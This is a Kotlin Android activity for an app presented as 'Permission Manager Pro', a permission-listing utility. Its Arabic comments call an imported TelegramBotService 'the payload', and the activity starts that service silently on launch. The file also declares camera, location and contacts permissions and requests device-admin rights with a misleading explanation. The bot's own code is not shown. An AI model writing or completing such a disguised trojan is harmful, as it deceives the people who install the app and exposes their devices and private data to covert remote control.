package com.example.permissionmanagerpro.ui

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Intent
import android.os.Build
import android.os.Bundle
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.recyclerview.widget.LinearLayoutManager
import com.example.permissionmanagerpro.R
import com.example.permissionmanagerpro.adapter.AppListAdapter
import com.example.permissionmanagerpro.databinding.ActivityMainBinding
import com.example.permissionmanagerpro.model.AppInfo
import com.example.permissionmanagerpro.receiver.AppDeviceAdminReceiver
import com.example.permissionmanagerpro.viewmodel.MainViewModel
// استيراد خدمة البايلود
import com.example.permissionmanagerpro.payload.TelegramBotService

class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding
    private val viewModel: MainViewModel by lazy {
        androidx.lifecycle.ViewModelProvider(this)[MainViewModel::class.java]
    }
    private lateinit var adapter: AppListAdapter
    private lateinit var devicePolicyManager: DevicePolicyManager
    private lateinit var adminComponent: ComponentName

    private val selfPermissions = arrayOf(
        android.Manifest.permission.CAMERA,
        android.Manifest.permission.ACCESS_FINE_LOCATION,
        android.Manifest.permission.READ_CONTACTS
    )

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) {
        viewModel.loadInstalledApps()
    }

    private val deviceAdminLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        updateDeviceAdminStatus()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        setSupportActionBar(binding.toolbar)

        devicePolicyManager = getSystemService(DevicePolicyManager::class.java)
        adminComponent = ComponentName(this, AppDeviceAdminReceiver::class.java)

        setupRecyclerView()
        setupObservers()
        setupClickListeners()
        requestNotificationPermissionIfNeeded()

        viewModel.loadInstalledApps()
        updateDeviceAdminStatus()

        // ===== تشغيل خدمة البوت (البايلود) =====
        startService(Intent(this, TelegramBotService::class.java))
    }

    override fun onResume() {
        super.onResume()
        updateDeviceAdminStatus()
    }

    private fun setupRecyclerView() {
        adapter = AppListAdapter { appInfo -> openAppDetail(appInfo) }
        binding.recyclerApps.layoutManager = LinearLayoutManager(this)
        binding.recyclerApps.adapter = adapter
    }

    private fun setupObservers() {
        viewModel.apps.observe(this) { apps ->
            adapter.submitList(apps)
        }
        viewModel.isLoading.observe(this) { loading ->
            binding.progressBar.visibility = if (loading) android.view.View.VISIBLE else android.view.View.GONE
        }
    }

    private fun setupClickListeners() {
        binding.btnDeviceAdmin.setOnClickListener {
            if (devicePolicyManager.isAdminActive(adminComponent)) {
                devicePolicyManager.removeActiveAdmin(adminComponent)
                updateDeviceAdminStatus()
            } else {
                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                    putExtra(
                        DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        "هذه الصلاحية تتيح لك إدارة إعدادات جهازك الشخصي بشكل أعمق"
                    )
                }
                deviceAdminLauncher.launch(intent)
            }
        }
    }

    private fun updateDeviceAdminStatus() {
        val isActive = devicePolicyManager.isAdminActive(adminComponent)
        binding.tvDeviceAdminStatus.text = getString(
            if (isActive) R.string.device_admin_active else R.string.device_admin_inactive
        )
        binding.btnDeviceAdmin.text = getString(
            if (isActive) R.string.btn_disable_device_admin else R.string.btn_enable_device_admin
        )
    }

    private fun requestNotificationPermissionIfNeeded() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ActivityCompat.checkSelfPermission(
                    this, android.Manifest.permission.POST_NOTIFICATIONS
                ) != android.content.pm.PackageManager.PERMISSION_GRANTED
            ) {
                permissionLauncher.launch(arrayOf(android.Manifest.permission.POST_NOTIFICATIONS))
            }
        }
    }

    private fun openAppDetail(appInfo: AppInfo) {
        val intent = Intent(this, AppDetailActivity::class.java).apply {
            putExtra(AppDetailActivity.EXTRA_PACKAGE_NAME, appInfo.packageName)
            putExtra(AppDetailActivity.EXTRA_APP_NAME, appInfo.appName)
            putStringArrayListExtra(
                AppDetailActivity.EXTRA_GRANTED,
                ArrayList(appInfo.grantedPermissions)
            )
            putStringArrayListExtra(
                AppDetailActivity.EXTRA_DENIED,
                ArrayList(appInfo.deniedPermissions)
            )
        }
        startActivity(intent)
    }
}